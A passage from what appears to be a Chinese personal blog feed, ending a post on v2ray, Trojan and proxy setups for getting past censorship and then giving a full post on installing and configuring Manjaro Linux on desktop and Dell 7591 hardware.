<p>其实这个时候可以直接上dnscrypt解决问题</p>
<p>另外, v2ray的服务器和本地的时间一定要记得用ntp同步一下,不然两边时间不一样也会拒绝连接的</p>
<h2 id="trojan的方案">Trojan的方案</h2>
<p>原理和v2ray的websocket+TLS差不多，只在乎延迟和速度的话，Trojan比v2ray的websocket+TLS一般会快一点（其实大部分时候也就快了不到10%） 但是Trojan没有好的客户端（特别是安卓），路由器上折腾也没有特别好的方案 而且不支持CDN。</p>
<p>真追求速度也不太建议这个，理论上websocket肯定比KCP慢，折腾党可以试试。特殊时期可以留一条这样的备用线（备用防封），另一条线裸跑ss走大流量的，就差不多够了。</p>
<h2 id="更新">更新</h2>
<p>最近<span class="exturl" data-url="aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lL3ZtemowNC5wZGY=">基于长短期记忆网络的V2ray流量识别方法<i class="fa fa-external-link-alt"></i></span>好像在微博等地引起了小小的恐慌。这个大概就是解包后上神经网络之类的，和之前的一篇 <span class="exturl" data-url="aHR0cHM6Ly9pZWVleHBsb3JlLmllZWUub3JnL2RvY3VtZW50LzgwNDgxMTY=">https://ieeexplore.ieee.org/document/8048116<i class="fa fa-external-link-alt"></i></span> 步骤、程序都是一样的，就把随机森林换成了k近邻，高度怀疑是水论文。这个也就针对一下vmess、tcp，tls估计搞不定。</p>
<p>不过v2ray作者弃坑几个月了，不知道近况如何</p>
<h3 id="最后还是选择了机场">最后还是选择了机场</h3>
<p>现在性价比还是机场最高，同样是每月5美元机场大概能提供远高于自建的速度和线路选择（还有很多Netflix线路和低延迟节点）。</p>
<h3 id="移动dns投毒解决方案2019">移动DNS投毒解决方案2019</h3>
<p>使用Pcap_DNSProxy, 先下载<span class="exturl" data-url="aHR0cHM6Ly9ubWFwLm9yZy9kb3dubG9hZC5odG1s">nmap<i class="fa fa-external-link-alt"></i></span>再选winpcap兼容模式安装,再下载Pcap_DNSProxy安装时可能需要管理员权限。然后在网卡设定 DNS 解析为 127.0.0.1 (IPv4) 和 ::1 (IPv6) 。（适合电脑上折腾，有条件还是直接折腾路由器。） 详情参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NoZW5ncjI4L1BjYXBfRE5TUHJveHkvdHJlZS9tYXN0ZXIvRG9jdW1lbnRz">https://github.com/chengr28/Pcap_DNSProxy/tree/master/Documents<i class="fa fa-external-link-alt"></i></span> 以及<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmJnbWUubWUvcG9zdHMvc29tZS1pZGVhcy1hYm91dC1hbnRpLXBvbGx1dGlvbi1kbnMtc2VydmVy">https://blog.bgme.me/posts/some-ideas-about-anti-pollution-dns-server<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="更换vps厂商为hostwinds更换websocket协议为http2">更换VPS厂商为hostwinds,更换websocket协议为HTTP2</h3>
<p>决定把vultr换成速度更快的hostwinds，世界加钱可及（并没有钱搞Google Fi之类的物理穿越） hostwinds选项有VPS和cloud，cloud是按小时收费的，这个价位当然也不是aws或google cloud那种真正的云主机，问了下客服，答复如下：</p>
<p>The Difference Between VPS &amp; cloud There is no difference other than the name. The VPSs come with more of a preconfigured set up, Linux/Windows, managed/unmanaged, etc, where the Cloud would start as an unmanaged Linux VPS that you can add additional set up to.</p>
<p>这里我不小心选错了，发工单申请退款速度很快，客服一直在线（但是据说支付鸨坑你会给你退到余额里，不会给你退钱） 不愿意买一个月冒险想先试试的可以直接上小时收费的cloud选项 这家服务商有给提供rDNS功能，网上冲浪时记得伪装。别的都还好，就是机房有点少，不过暂时还没被盯上。速度也还行吧。（这家不太推荐用来建站, 小站除外）</p>
<p>看起来并不限速，但是我装上之后速度只有几百k，不知道为什么，有空再看看 &gt;Testing download speed................................................................................ Download: 248.93 Mbit/s Testing upload speed................................................................................................ Upload: 397.44 Mbit/s</p>
<p>应该是被运营商Qos降了优先级，还是kcp吧</p>
<h2 id="配置推荐">配置推荐</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dpbnVlcnpoL2dvc3Q=">gost<i class="fa fa-external-link-alt"></i></span> 用来搞搞跳板和二级代理和多级代理的跳板不错 <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BUYWNoeW9uRGV2ZWwv5ryr6LCI5ZCE56eN6buR56eR5oqA5byPLWRucy3mioDmnK/lnKjku6PnkIbnjq/looPkuK3nmoTlupTnlKgtNjJjNTBlNThjYmQw">漫谈各种黑科技式 DNS 技术在代理环境中的应用<i class="fa fa-external-link-alt"></i></span> DNS什么的看这里 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21lbGxvdy1pby9tZWxsb3c=">mellow<i class="fa fa-external-link-alt"></i></span> 跨平台的全局代理 <span class="exturl" data-url="aHR0cHM6Ly93d3cudjJyYXkuY29tLw==">Project V<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9ndWlkZS52MmZseS5vcmcv">新 V2Ray 白话文指南<i class="fa fa-external-link-alt"></i></span> 推荐稍微懂一点网络知识和能自己折腾VPS的自己直接照着文档和教程装就好了，一键安装脚本反而坑多（VPS小鸡只用来干这个可以直接脚本，但是至少要把默认端口之类的改一改） <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL216ejIwMTcvVjJSYXlB">v2rayA<i class="fa fa-external-link-alt"></i></span> 一个linux下的web配置工具，感觉还行。linux下图形界面客户端一直是个问题，这种小配置工具拿Qt或者electron搞出来的巨大的包总感觉怪怪的，还是直接web化在浏览器里面启动比较舒服 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc29mdGV0aGVyLm9yZy8=">https://www.softether.org/<i class="fa fa-external-link-alt"></i></span> 使用ssl型加密的vpn也有比较强的抗封锁能力（由于历史原因，属于第一批被墙打爆的重点照顾对象），但是搭建配置非常麻烦，速度也比v2慢，建议放弃（包月包年买服务另当别论） 这里有个wulabing的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3d1bGFiaW5nL1YyUmF5X3dzLXRsc19iYXNoX29uZWtleQ==">脚本<i class="fa fa-external-link-alt"></i></span> 卸载要这样。 &gt;如果不能重装系统，你可以通过删除以下文件夹，重新安装来完成更新 /etc/nginx /etc/v2ray /root/v2ray ~/.acme.sh</p>
<p>另， https://github.com/edwardz246003/shadowsocks</p>
<p>最后，土豪请直接机场，大土豪请去用境外实体卡和Google Fi</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/www.png" alt="Picture" style="zoom:80%;" /></p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>v2ray</tag>
      </tags>
  </entry>
  <entry>
    <title>你好，Manjaro。再见，Manjaro。</title>
    <url>/ff0e/</url>
    <content><![CDATA[<p>本来我是想装个双系统的，但是想起教研室还有两个老主机，那就..... <a id="more"></a></p>
<p><del>装Arch是不可能装Arch的</del></p>
<h2 id="更新再见manjaro">更新———再见Manjaro</h2>
<p>前一阵Manjaro社区出的争吵让我跑路了，Manjaro之前用的还比较舒服（当然直到现在都比较舒服），以后就不知道怎么样了。外面Arch社区骂声一片，里面还总在内斗，不断有人出走，前几周连jonathon都气走了（跑去隔壁endeavour os了）</p>
<p>jonathon的声明在<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5tYW5qYXJvLm9yZy90L2NoYW5nZS1vZi10cmVhc3VyZXItZm9yLW1hbmphcm8tY29tbXVuaXR5LWZ1bmRzLzE1NDg4OA==">这篇帖子<i class="fa fa-external-link-alt"></i></span></p>
<p>过程大概是这样的，philm（Manjaro的CEO，反正Manjaro社区的不少人都觉得此人非常讨厌）挪用社区赞助捐款2000欧元，用于给自己买的电脑。这次购买并没有跟掌钱管家jonathon商量，也没有在社区内征得同意。jonathon觉得按照规定这钱只能用于Manjaro项目的网站建设、项目推广之类的，不是给你们恰烂钱的，然后在论坛发帖子怼philm，然后帖子被删了一次，jonathon的管理员也被撤了。帖子下面众人纷纷表示philm不回应道歉以后再也不捐助Manjaro了，不少人表示以后再也不用Manjaro了，并考虑跑路到KDE Neon、Kubuntu、Arch、Endeavour OS。</p>
<p>philm的回应闪烁其辞，一直说事情不是大家想的那个样子的，但是大家怼他让他公布他和jonathon的完整聊天记录他又不肯。最后philm屁事没有，jonathon跑路去了Endeavour OS。</p>
<p>我之前从Ubuntu换到Manjaro，现在跟着jonathon跑到endeavour os（Antergos 的后继项目），因为懒得搞网卡驱动和g双显卡驱动了（这个Arch系的发行版显卡驱动、TLP和s-tui之类的也会附带装上，默认xfce桌面有很多系统自带的定制，我装的KDE，基本上相对于Arch没怎么魔改，附带了驱动个和很多常用的包）目前用着感觉还好，观察一下再评价。</p>
<h2 id="安装">安装</h2>
<p>选Manjaro是因为对华硕老主板的硬件和驱动支持比较好，安装也比较方便（我可不想自己折腾Nvida驱动）。</p>
<p>（喜欢KDE桌面，又不想用openSUSE，Kubuntu之前试过体验不是特别好，转了一圈就Manjaro了）</p>
<p>去官网下了最新版的 Manjaro18.1.5 KDE桌面版本，还是拿Rufus做好启动盘用UEFI装，这里把空闲的老机子直接擦除原来已毕业师兄的win10（erase disk），选 no Hibernate（我不太喜欢systemd，就没设休眠）</p>
<p>看到选项里有个选择LibreOffice还是Free Office的选项，这里我选了FreeOffice试用，体验过两个月再回来填坑写体会。 （更新，还是WPS吧。。。）</p>
<p>可以断网安装。没有遇到问题，直接装好了，超乎想象的顺利。唯一的小插曲是装完系统后U盘只剩4M空间，用win10默认的格式化找不回来了，看了<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNzc3MjgyNQ==">这里<i class="fa fa-external-link-alt"></i></span> 网上教程已经很多了，我也不打算再写一篇了，下面仅作个人记录(其实并不怎么需要教程，过时得太快，还不如直接看官方wiki或者iso里打包的安装手册，不想看直接照着提示直接装都没问题，比Ubuntu好装太多了) <img src="/ff0e/neofetch-manjaro.webp" alt="manjaro-neofetch" /> 内置python是3.8.1，我一时竟有些不习惯😂</p>
<h2 id="配置">配置</h2>
<h3 id="换镜像源">换镜像源</h3>
<p>当然还是换成你电的，在<code>/​etc/​pacman.d/​mirrorlist</code>加上你电</p>
<h3 id="输入法">输入法</h3>
<p>更新，现在有一个官方打包的AUR： manjaro-asian-input-support，在community里面，有manjaro-asian-input-support-fcitx、manjaro-asian-input-support-ibus、manjaro-asian-input-support-ibus、manjaro-asian-input-support-fcitx5</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S manjaro-asian-input-support-fcitx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后重启直接就能用了</p>
<p>KDE推荐fcitx，Gnome下大概ibus体验会好一点？（好吧其实我之前在Ubuntu Gnome上用的也是fcitx）</p>
<p><strong>下面这些都不用看了</strong></p>
<p>我用的<del>sunpinyin</del>libpinyin（一个比sunpinyin更新的输入法），googlepinyin也可以，sougoupinyin不推荐，对于它的流氓行为我实在无法放心（如果非要装，记得装fcitx qt4 或 qt5）</p>
<p>如果想要联网提示的功能可以装个cloudpinyin(要用archlinuxcn的源)</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S fcitx-im fcitx-googlepinyin fcitx-libpinyin fcitx-cloudpinyin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有个小问题，那个很多教程都写的/.xproflie, 官方wiki里新版是 ~/.pam_environment里面加上那三行, fcitx官网上说是那个~./xprofile, 这里我放到.pam_enviroment里面了。</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">GTK_IM_MODULE&#x3D;fcitx
QT_IM_MODULE&#x3D;fcitx
XMODIFIERS&#x3D;@im&#x3D;fcitx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后点开右下角键盘的configure（配置）看不到输入法了，界面是空的，以为是系统语言非中文的问题，但是换了系统语言重启了以后还是不行。 运行了一下fcitx-diagnose, 报这个错误</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">fcitx: BadWindow (invalid Window parameter)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>感觉是看不知道哪个教程的时候在~/.xinitrc里面乱配置的时候出问题了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LC_ALL</span></span><span class="token operator">=</span>zh_CN.UTF-8
<span class="token builtin class-name">export</span> <span class="token assign-left variable">GTK_IM_MODULE</span><span class="token operator">=</span>fcitx
<span class="token builtin class-name">export</span> <span class="token assign-left variable">QT_IM_MODULE</span><span class="token operator">=</span>fcitx
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">XMODIFIERS</span></span><span class="token operator">=</span><span class="token string">"@im=fcitx"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>搜了一下是我弱智了，看<span class="exturl" data-url="aHR0cHM6Ly9iYnMuYXJjaGxpbnV4Y24ub3JnL3ZpZXd0b3BpYy5waHA/aWQ9MTg2Mg==">这里<i class="fa fa-external-link-alt"></i></span>，照着教程乱搞的时候都没注意到。 这里把exec放到后面就行了，或者放到.xprofile里面</p>
<p>配置看这里 https://fcitx-im.org/wiki/Configure_(Other)/zh-hans</p>
<p>我看很多教程都是用的fcitx-configtool，这里推荐KDE桌面用kcm-fcitx进行设置，也可以直接编辑config文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S kcm-fcitx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="软件包管理">软件包管理</h3>
<h4 id="pacman">pacman</h4>
<p>装包首选pacman，然后是AUR，然后是其他pip、npm、deb之类的包（貌似Manjaro发布的20版pamac软件商店还支持了snap和flatpac......），然后是自己编译（对自己打包技术自信的编译狂魔请无视), 这样可以避免不少包冲突。 yaourt已经停止维护了<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>，2020年了很多教程都还是这个，请自行换成yay<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>等</p>
<p>另外多说一句，Manjaro很多地方和Arch还是不一样的，随便添加arch源或者archlinuxcn源是要出问题的</p>
<p>要加包优先从AUR里面加，尽量不要用archlinuxcn里的东西，Manjaro很多魔改和更新依赖版本速度和Arch不一样，非要使用archlinuxcn灵车漂移就把Manjaro设成unstable（并且出了事不要去archlinuxcn那里问，切记）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman-mirrors --api --set-branch unstable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>虽然名字叫unstable，但是它和Arch的stable基本上是类似的（它还要比Arch的stable慢三天），这意味着换成unstable再上archlinuxcn源灵车漂移翻车的几率会小一点。</p>
<p>Manjaro的包会比Arch的更新频率慢一点，Manjaro有三种选项，stable，testing和unstable，unstable比Arch的stable慢三天左右，testing比unstable慢，stable比testing慢。一般只是延后了几周而已，可以放心上unstable</p>
<h4 id="yay安装aur软件">yay安装AUR软件</h4>
<p>这里用vscode举个栗子</p>
<p>不像apt有官方包，VSCode在文档上说可以用这个<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9zZXR1cC9saW51eCNfYXVyLXBhY2thZ2UtZm9yLWFyY2gtbGludXg=">非官方包<i class="fa fa-external-link-alt"></i></span></p>
<p>按照正常的AUR安装方式是这样的</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S <span class="token function">git</span>
<span class="token builtin class-name">cd</span> /Downloads
<span class="token function">git</span> clone https://AUR.archlinux.org/visual-studio-code-bin.git
<span class="token builtin class-name">cd</span> visual-studio-code-bin/
<span class="token function">sudo</span> pacman -U visual-studio-code-bin-*.pkg.tar.xz
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/ <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">rm</span> -rfv visual-studio-code-bin/
code <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我们有<code>yay -S visual-studio-code-bin</code>可以代替上面那一串命令 （pacman现在也有了包，直接pacman就好了<code>pacman -S code</code>）</p>
<h4 id="pamac">pamac</h4>
<p>另一种方法是直接从软件商店里点击安装，pamac或者octopi，其实也不算win10 巨硬store或者snap那种软件商店，大概就是一个pacman的GUI客户端吧（很多时候报错和提示并不好用，建议下载和更新还是用命令）</p>
<p>尤其不要同时开着pamac图形界面并打开pacman，pacman进程加锁出错系统容易崩了</p>
<h3 id="网上冲浪">网上冲浪</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S v2ray<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>把config.json放到/etc/v2ray下面 然后配置开机自启和启动（这里用systemd）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> v2ray  <span class="token comment">#开机启动</span>
systemctl start v2ray<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后配合switchyomega或者<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21lbGxvdy1pby9tZWxsb3c=">mellow<i class="fa fa-external-link-alt"></i></span>或者<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvZmwwci9wcm94eWNoYWlucy1uZw==">proxychains-ng<i class="fa fa-external-link-alt"></i></span></p>
<p>如果还是习惯客户端可以试试v2rayA<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></p>
<h3 id="其他">其他</h3>
<p>暂时没什么要说了，过一个月再来说体验吧，美化什么的也不想搞了，老主机带不动，我也老了，哎呀，对花里胡哨的欣赏不来了，一律默认配置</p>
<p>想起什么再说吧，ArchWiki真棒，看Wiki吧</p>
<h4 id="一些设置的小问题">一些设置的小问题</h4>
<p>装完输入法之后输入法调不出来了，发现Yakuake也调不出来了，感觉快捷键设置冲突，改快捷键设置就好了。</p>
<h2 id="后记">后记</h2>
<p>总能看到一大批Arch玩家在Linux群里发洗手图疯狂劝退Manjaro用户 但是看到下面这篇，我决定还是用Manjaro吧。各种洗手劝退根本没给出让我换系统的强力理由 <span class="exturl" data-url="aHR0cHM6Ly9yZW50cnkuY28vbWFuamFyby1jb250cm92ZXJzaWVz">Manjaro Controversies<i class="fa fa-external-link-alt"></i></span> 中文版<span class="exturl" data-url="aHR0cHM6Ly9zemNsc3lhLm1lL3poLWNuL3Bvc3RzL2xpbnV4L21hbmphcm9fY29udHJvdmVyc2llcy8=">[译] Manjaro 悖论<i class="fa fa-external-link-alt"></i></span> 我还用windows呢，我还用Ubuntu呢，本弱智儿童欢乐多，你们随便怎么鄙视。自从当了硬件逃兵不折腾板子不玩单片机树莓派我连C都不怎么用，欢乐的拿python乱写脚本呢，节省心智的东西有时候真是好东西</p>
<p>人生苦短， In the long run, we are all dead（虽然我并不喜欢凯恩斯主义）</p>
<p>我一直觉得商业化是个好事，尤其是操作系统这种东西。私以为大多数情况下知识产权是个好东西，收费也是个好东西，垄断是个坏东西。开源的一个重要贡献就是打破垄断。（虽然现在很多专利什么的都被玩坏了，特别是国内） 操作系统这种工业级的东西，商业化是正道，<strong>微软的问题在于它的垄断，而不是商业化</strong></p>
<p>（这Manjaro一股 Windows Vista 味，好看好用，bug多也能接受</p>
<h2 id="时隔5个月的更新">时隔5个月的更新</h2>
<p>终于返校了，这疫情闹得，哎呀</p>
<p>据说长时间不追滚动更新可能滚炸，不管了，硬着头皮试一下</p>
<p>直接</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> pacman -Syyu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>更新后重启显示密码不对，不知道是什么问题，试着重置了一下密码</p>
<p>（并不是我忘记密码了，这里据说前一阵不少人的KDE桌面密码出问题登录认证失败了）</p>
<p>重启按esc进grub</p>
<p>按e，在有<code>linux /boot /vmlinuz-linux</code>的那一行添加<code>init=/bin/bash</code></p>
<p>ctrl+x出去输入<code>mount -n -o remount,rw /</code>给根目录读写权限，然后输<code>passwd</code>改密码，然后<code>reboot</code>重启</p>
<p>看起来没什么问题了，隔了几个月也没滚炸（至少看起来没有）</p>
<h2 id="笔记本也换成manjaro了">笔记本也换成Manjaro了</h2>
<h3 id="安装-1">安装</h3>
<p>小破本是灵越7591，不太想用win10了，Dell家的大部分系列都完美兼容Ubuntu（国外出售的7590的还有个developer版的装的就是Ubuntu，比预装win10少了一点微软授权费，可惜国内没有）</p>
<p>看到他们好多用黑苹果，我的本子不是4k，就没上黑果。（黑果Nvida独显也用不了）</p>
<p>Manjaro看到别人装上去还不错，索性就装Manjaro了（除了麦克风和显卡的驱动有点小麻烦，其他的蓝牙wifi触控板键盘休眠一切正常）Archwiki上也有同系列7590的参考<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a></p>
<p>BIOS里关secureboot，改raid on为AHIC（不装双系统可以忽略，双系统记得改AHIC不然win10会蓝屏卡在启动界面）</p>
<p>装完发现Manjaro 20居然添加了snap商店，这是要跟Canonical同流合污？（逐渐Ubuntu化</p>
<p>KDE桌面内存占用在700M左右，还行</p>
<p>Ubuntu的显卡和外接显示器对Dell的本子都配适的极好，有Dell官方担保，不想折腾可以直接上Ubuntu（这款海外版有的就是预装Ubuntu，双显卡解决方案应该是Prime）</p>
<h3 id="显卡驱动问题">显卡驱动问题</h3>
<p>不需要Nvida的卡就直接选free，装intel的核显就好了</p>
<p>想用Nvida的卡（好歹是一块1650ti不用太浪费了），装的时候Manjaro驱动选项可以直接选nofree，会自带</p>
<p>切换双显卡的配置可能导致看视频时卡成PPT，禁用硬件加速就好了，7591的丐版CPU硬解码也是带的动视频的（1080p没有任何问题）</p>
<h3 id="麦克风声卡配置">麦克风声卡配置</h3>
<p>之前7591的部分高通声卡驱动不行，麦克风用不了，后来有了一个开源的驱动<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZXNvZnByb2plY3Qvc29m">Sound open firmware<i class="fa fa-external-link-alt"></i></span>，总归是能用了。</p>
<p>在linux kernel在5.6或以上，安装麦克风声卡驱动用的sof-firmware，可以解决声音和麦克风问题</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S sof-firmware<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后重启，我第二次重启后失效，喇叭和耳机都没有声音。按照wiki里面修改<code>/etc/modprobe.d/audio-fix.conf</code>(新建一个)，然后写一行</p>
<pre class="line-numbers language-config" data-language="config"><code class="language-config">options snd-intel-dspcfg dsp_driver&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>就行了。</p>
<p>或者在Grub的配置文件<code>/etc/default/grub</code>里设置</p>
<pre class="line-numbers language-config" data-language="config"><code class="language-config">snd-intel-dspcfg.dsp_driver&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>实在不行再试试内核参数(Kernel parameters)加上<code>snd_hda_intel.dmic_detect=0</code></p>
<p>当然，仅仅是能用。声音效果不是太好，虽然灵越inspiron 7591/7590/7501 系列的扬声器声音本来就不太好，但是放点陶笛和埙的曲子还是有种凄婉呜咽感的，linux下用了sof之后感觉像是喇叭声。以后就只适合拿这个听刀郎了。</p>
<p>还有一个问题就是有的时候休眠挂起后再打开就没声音了，需要重启才行。暂时没找到什么好的办法，这个毛病之前win10就有</p>
<h3 id="mm耳机没声音">3.5mm耳机没声音</h3>
<p>耳机孔没声音，wiki上的解决方案是</p>
<blockquote>
<p>In <code>pavucontrol</code>, try changing the Pulseaudio output profile from "Analog Stereo Output" to "Analog Stereo Duplex".</p>
</blockquote>
<p>系统语言调成中文的用户点开系统设置-》音频音量设置=》音频=》高级=》内置音频，选模拟立体双工。</p>
<p>是的，这样就能用了（请忽略这个全损音质，耳机传来声音的时候我甚至觉得我的索尼耳机是拼多多10块钱买的）</p>
<h3 id="耗电问题">耗电问题</h3>
<p>这个目前我倒是没什么感觉，我的7591是97w的大电池版本，最好的省电办法是不用GNOME，KDE的掉电速度比GNOME大概能慢一半，轻度使用六七个小时没有太大问题。（跟win10上10个小时比还是有差距）。</p>
<p>极致省电可以上i3wm和禁用独显，不过7591电池够大，不像游戏本一样分分钟没电，倒是没有必要。</p>
<p>还有就是降压，给CPU降个50-75mV，效果感人。（对性能影响也很小）</p>
<p>然后安装thermald和tlp并设置开机自启动（tlp有个图形界面可惜是gtk的并且还在beta版，不太KDE用户建议用）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S thermald tlp
systemctl <span class="token builtin class-name">enable</span> thermald tlp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后自行设置电池模式。</p>
<h3 id="散热">散热</h3>
<p>当然7591/7590更要命的显然是捉急的散热，重度使用建议降压、换散热贴硅脂散热条、垫橡皮垫都安排上。有个s-tui可以查看CPU温度。</p>
<h2 id="其他个人设置">其他个人设置</h2>
<h3 id="常用软件">常用软件</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker</span>
<span class="token function">sudo</span> pacman -S docker docker-compose
<span class="token comment"># 设置开机自启</span>
<span class="token function">sudo</span> systemctl <span class="token builtin class-name">enable</span> docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="中英词典翻译和医学词典">中英词典翻译和医学词典</h4>
<p>这里我用的开源的GoldenDict配合离线和在线词典</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S goldendict<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>下载医学词典和英文词典，体验还是不错的，想要翻译功能可以添加有道和谷歌翻译</p>
<h3 id="博客搬迁">博客搬迁</h3>
<p>先装node.js（这里我装的12的lts版）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -Sy nodejs-lts-erbium<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后从github拉取自己的博客备份repo</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/archaeoraptor/blog.git blog
<span class="token builtin class-name">cd</span> blog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>另外我用的hexo-renderer-pandoc插件，这个插件要先装pandoc（不然会报错）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S pandoc
<span class="token function">npm</span> <span class="token function">install</span>
<span class="token function">git</span> clone https://github.com/next-theme/hexo-theme-next.git themes/next
hexo g <span class="token operator">&amp;&amp;</span> hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="windows软件解决方案">windows软件解决方案</h3>
<p>装wine体验还是不太好，虚拟机装个win7上跑qq和word，反正7591能加内存，加到32G就完事了，还不够就加64G（是的，这个系列支持64G内存，虽然说明书上写的只支持到32G）</p>
<h3 id="网上冲浪-1">网上冲浪</h3>
<p>qv2ray还不错，electron-ssr装上v2ray插件也不错，但是electron内存占用太高了。喜欢web版的还有一个v2raya可以用。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S qv2ray<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>装wireguard</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S wireguard-tools wireguard-dkms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果用机场的话，可以装个clash，然后配置开机自启和规则（那个win版clash的图形界面真的反直觉反人类，相当难受，clashy也没好到哪去），貌似也支持套个tun/tap用来全局代理(似乎并不怎么好用)</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S clash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以配置systemd让clash开机自启，<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0RyZWFtYWNyby9jbGFzaC93aWtpL2NsYXNoLWFzLWEtZGFlbW9u">wiki<i class="fa fa-external-link-alt"></i></span>上还提供了docker-compose和pm2的方法(配置文件放在<code>~/.config/clash</code> )。(貌似pm2方便一点？尤其是装了nodejs的话，不过clash是go开发的官方推荐docker，不过docker和pm2要开机自启还是得用systemd)</p>
<p>上个月发布的clash1.0版本是和老版本不兼容的<a href="#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>，AUR里打包的clash是不兼容的，所以要手动修改yml文件或者自己编译老版本的clash</p>
<blockquote>
<p><code>Proxy</code>, <code>Proxy Group</code> and <code>Rule</code> is no longer used. They are now respectively <code>proxies</code>, <code>proxy-groups</code> and `rules</p>
</blockquote>
<p>(修改的话一般只要修改<code>Proxy</code>, <code>Proxy Group</code> and <code>Rule</code> 这三个参数为<code>proxies</code>, <code>proxy-groups</code> and `rules就行了)</p>
<p>设置完成后重启网络服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart systemd-networkd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="中英文和字体设置">中英文和字体设置</h3>
